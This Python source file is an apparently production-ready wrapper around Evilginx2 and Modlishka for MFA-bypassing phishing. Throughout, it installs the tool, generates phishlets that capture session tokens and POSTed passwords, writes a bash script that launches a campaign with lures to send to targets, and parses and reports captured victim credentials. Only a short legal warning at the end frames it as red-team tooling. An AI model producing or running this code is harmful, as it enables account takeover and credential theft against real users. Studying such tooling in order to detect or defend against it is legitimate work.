#!/usr/bin/env python3
"""
Evilginx2 - Advanced Phishing with MFA Bypass
Session token capture and 2FA/MFA bypass capabilities
Production-ready phishing framework for red team operations
"""

import subprocess
import json
import logging
import argparse
import os
import sys
from pathlib import Path
from typing import Dict, List, Optional
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class EvilginxPhishing:
    """
    Evilginx2 integration for advanced phishing campaigns
    Captures session tokens to bypass 2FA/MFA
    """
    
    def __init__(self, evilginx_dir: Optional[str] = None):
        self.evilginx_dir = evilginx_dir or str(Path.home() / "evilginx2")
        self.phishlets_dir = Path(self.evilginx_dir) / "phishlets"
        
    def check_installation(self) -> bool:
        """Check if Evilginx2 is installed"""
        evilginx_bin = Path(self.evilginx_dir) / "evilginx"
        
        if evilginx_bin.exists():
            logger.info(f"✅ Evilginx2 found at: {evilginx_bin}")
            return True
        
        # Check in PATH
        try:
            result = subprocess.run(['evilginx', '-h'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                logger.info("✅ Evilginx2 is installed and in PATH")
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        
        logger.warning("⚠️  Evilginx2 not found - use --install to install it")
        return False
    
    def install_evilginx(self) -> bool:
        """Install Evilginx2 from source"""
        logger.info("🔧 Installing Evilginx2...")
        
        # Check if Go is installed
        try:
            result = subprocess.run(['go', 'version'], capture_output=True, timeout=5)
            if result.returncode != 0:
                logger.error("❌ Go is not installed. Install from: https://golang.org/dl/")
                return False
            logger.info(f"✅ Go is installed: {result.stdout.decode().strip()}")
        except (FileNotFoundError, subprocess.TimeoutExpired):
            logger.error("❌ Go is not installed")
            return False
        
        try:
            # Clone repository
            if not os.path.exists(self.evilginx_dir):
                logger.info("📥 Cloning Evilginx2 repository...")
                subprocess.run([
                    'git', 'clone',
                    'https://github.com/kgretzky/evilginx2.git',
                    self.evilginx_dir
                ], check=True, timeout=120)
            else:
                logger.info(f"✅ Repository already exists at: {self.evilginx_dir}")
            
            # Build using go build (faster than make)
            logger.info("🔨 Building Evilginx2...")
            evilginx_bin = Path(self.evilginx_dir) / "evilginx"
            
            if not evilginx_bin.exists():
                subprocess.run(
                    ['go', 'build', '-o', 'evilginx', 'main.go'], 
                    cwd=self.evilginx_dir, 
                    check=True, 
                    timeout=180
                )
            
            logger.info("✅ Evilginx2 installed successfully!")
            logger.info(f"📍 Binary location: {evilginx_bin}")
            logger.info(f"📁 Phishlets directory: {self.phishlets_dir}")
            return True
            
        except subprocess.CalledProcessError as e:
            logger.error(f"❌ Installation failed: {e}")
            return False
        except Exception as e:
            logger.error(f"❌ Error: {e}")
            return False
    
    def list_phishlets(self) -> List[Dict]:
        """List available phishlets"""
        if not os.path.exists(self.phishlets_dir):
            logger.error(f"Phishlets directory not found: {self.phishlets_dir}")
            return []
        
        phishlets = []
        
        for phishlet_file in self.phishlets_dir.glob('*.yaml'):
            phishlets.append({
                'name': phishlet_file.stem,
                'file': str(phishlet_file)
            })
        
        return sorted(phishlets, key=lambda x: x['name'])
    
    def create_phishlet(self, target_service: str, target_domain: str,
                       output_file: str) -> Dict:
        """
        Create custom phishlet configuration
        
        Args:
            target_service: Service name (e.g., 'microsoft', 'google')
            target_domain: Target domain to phish
            output_file: Output phishlet file
        """
        phishlet_template = f"""
author: '@cerberus_team'
min_ver: '3.0.0'
proxy_hosts:
  - {{{target_service}_domain}}
  - {{phish_sub}}.{{root_domain}}

sub_filters:
  - triggers_on: "{target_domain}"
    orig_sub: ""
    domain: "{{{target_service}_domain}}"
    search: "{target_domain}"
    replace: "{{{{hostname}}}}"
    mimes:
      - text/html
      - application/json
      - application/javascript
      - text/javascript

auth_tokens:
  - domain: ".{target_domain}"
    keys:
      - "__Host-SESSIONID"
      - "SSID"
      - "refresh_token"

credentials:
  username:
    key: "email"
    search: "(.*)"
    type: "post"
  password:
    key: "password"
    search: "(.*)"
    type: "post"

login:
  domain: "{target_domain}"
  path: "/login"
"""
        
        try:
            with open(output_file, 'w') as f:
                f.write(phishlet_template)
            
            logger.info(f"Phishlet created: {output_file}")
            logger.warning("⚠️  Customize the phishlet before using!")
            
            return {
                'status': 'created',
                'file': output_file,
                'target': target_domain
            }
            
        except Exception as e:
            logger.error(f"Error creating phishlet: {e}")
            return {'error': str(e)}
    
    def generate_campaign_config(self, phishlet: str, domain: str,
                                ip: str, port: int = 443) -> str:
        """
        Generate Evilginx2 campaign configuration commands
        
        Returns script to configure and launch campaign
        """
        config_script = f"""#!/bin/bash
# Evilginx2 Campaign Configuration
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

# Prerequisites:
# 1. Domain '{domain}' pointing to {ip}
# 2. Valid SSL certificate (Let's Encrypt recommended)
# 3. Root access (port 443 binding)

cat << 'EOF' | sudo evilginx
# Configure domain and IP
config domain {domain}
config ip {ip}

# Enable phishlet
phishlets hostname {phishlet} {{{{phish_sub}}}}.{domain}
phishlets enable {phishlet}

# Create lure
lures create {phishlet}
lures edit 0 redirect_url https://legitimate-site.com
lures edit 0 info "Campaign: {phishlet}"
lures get-url 0

# Show sessions (run separately after victims visit)
# sessions
EOF

echo ""
echo "=== CAMPAIGN READY ==="
echo "Phishing URL will be displayed above"
echo "Send to targets and monitor sessions"
echo ""
echo "To view captured sessions:"
echo "  sudo evilginx"
echo "  sessions"
echo ""
"""
        
        return config_script
    
    def parse_sessions(self, sessions_json: str) -> List[Dict]:
        """
        Parse captured sessions from Evilginx2
        
        Args:
            sessions_json: Path to exported sessions JSON
        """
        try:
            with open(sessions_json, 'r') as f:
                sessions = json.load(f)
            
            parsed = []
            
            for session in sessions:
                parsed.append({
                    'id': session.get('id'),
                    'phishlet': session.get('phishlet'),
                    'username': session.get('username'),
                    'password': session.get('password'),
                    'tokens': session.get('tokens', {}),
                    'custom': session.get('custom', {}),
                    'remote_addr': session.get('remote_addr'),
                    'create_time': session.get('create_time'),
                    'update_time': session.get('update_time')
                })
            
            return parsed
            
        except Exception as e:
            logger.error(f"Error parsing sessions: {e}")
            return []
    
    def generate_report(self, sessions: List[Dict], output_file: str):
        """Generate phishing campaign report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'total_victims': len(sessions),
            'successful_captures': len([s for s in sessions if s.get('tokens')]),
            'sessions': sessions,
            'summary': {
                'unique_ips': len(set([s['remote_addr'] for s in sessions if s.get('remote_addr')])),
                'phishlets_used': len(set([s['phishlet'] for s in sessions if s.get('phishlet')]))
            }
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"Report saved to: {output_file}")
        
        return report


class ModlishkaPhishing:
    """
    Alternative: Modlishka reverse proxy phishing tool
    """
    
    def __init__(self):
        pass
    
    def generate_config(self, target: str, phishing_domain: str,
                       cert_file: str, key_file: str) -> Dict:
        """
        Generate Modlishka configuration
        
        Returns configuration JSON
        """
        config = {
            "proxyDomain": phishing_domain,
            "listeningAddress": "0.0.0.0",
            "proxyAddress": f"https://{target}",
            "target": target,
            "targetRes": "",
            "targetRules": f"PC:http://{target}",
            "jsRules": "",
            "terminateTriggers": "",
            "terminateUrl": "",
            "jsRulesPath": "",
            "unauthAddr": "",
            "unauthAddrRedirectOff": False,
            "listeningPort": 443,
            "autocert": False,
            "certKey": key_file,
            "certPool": cert_file,
            "forceHTTPS": True,
            "forceHTTP": False,
            "dynamicMode": False,
            "debug": True,
            "logPostOnly": True,
            "disableSecurity": False,
            "log": "modlishka.log",
            "plugins": "all",
            "credParams": "user,email,password,pass"
        }
        
        return config


def main():
    parser = argparse.ArgumentParser(description="Evilginx2 Phishing Framework")
    parser.add_argument('--install', action='store_true', help='Install Evilginx2')
    parser.add_argument('--list-phishlets', action='store_true', help='List available phishlets')
    parser.add_argument('--create-phishlet', help='Create custom phishlet')
    parser.add_argument('--target-domain', help='Target domain for phishlet')
    parser.add_argument('--output', help='Output file')
    parser.add_argument('--generate-campaign', help='Generate campaign config for phishlet')
    parser.add_argument('--domain', help='Your phishing domain')
    parser.add_argument('--ip', help='Your server IP')
    parser.add_argument('--parse-sessions', help='Parse captured sessions JSON')
    
    args = parser.parse_args()
    
    evilginx = EvilginxPhishing()
    
    if args.install:
        evilginx.install_evilginx()
        return
    
    if args.list_phishlets:
        phishlets = evilginx.list_phishlets()
        
        if not phishlets:
            print("No phishlets found. Install Evilginx2 first.")
            return
        
        print(f"\n{'='*80}")
        print("AVAILABLE PHISHLETS")
        print(f"{'='*80}\n")
        
        for p in phishlets:
            print(f"  - {p['name']}")
        
        print(f"\nTotal: {len(phishlets)} phishlets")
        return
    
    if args.create_phishlet:
        if not args.target_domain or not args.output:
            print("Error: --target-domain and --output required")
            return
        
        result = evilginx.create_phishlet(
            args.create_phishlet,
            args.target_domain,
            args.output
        )
        
        print(json.dumps(result, indent=2))
        return
    
    if args.generate_campaign:
        if not args.domain or not args.ip:
            print("Error: --domain and --ip required")
            return
        
        script = evilginx.generate_campaign_config(
            args.generate_campaign,
            args.domain,
            args.ip
        )
        
        output_file = args.output or f'campaign_{args.generate_campaign}.sh'
        
        with open(output_file, 'w') as f:
            f.write(script)
        
        os.chmod(output_file, 0o755)
        
        print(f"Campaign configuration saved to: {output_file}")
        print(f"\nRun: sudo ./{output_file}")
        return
    
    if args.parse_sessions:
        sessions = evilginx.parse_sessions(args.parse_sessions)
        
        print(f"\n{'='*80}")
        print("CAPTURED SESSIONS")
        print(f"{'='*80}\n")
        
        for session in sessions:
            print(f"ID: {session['id']}")
            print(f"  Username: {session.get('username', 'N/A')}")
            print(f"  Password: {session.get('password', '***')}")
            print(f"  Tokens: {len(session.get('tokens', {}))} captured")
            print(f"  IP: {session.get('remote_addr', 'N/A')}\n")
        
        if args.output:
            evilginx.generate_report(sessions, args.output)
        
        return
    
    print("\n🎣 Evilginx2 - Advanced Phishing Framework")
    print("\n⚠️  LEGAL WARNING:")
    print("  - Requires explicit written authorization")
    print("  - Use only in authorized red team engagements")
    print("  - Unauthorized phishing is illegal")
    print("\n📥 Installation:")
    print("  python cerberus_agents/evilginx_phishing.py --install")
    print("\n📚 Resources:")
    print("  https://github.com/kgretzky/evilginx2")
    print("  https://breakdev.org/evilginx-advanced-phishing/")


if __name__ == "__main__":
    main()
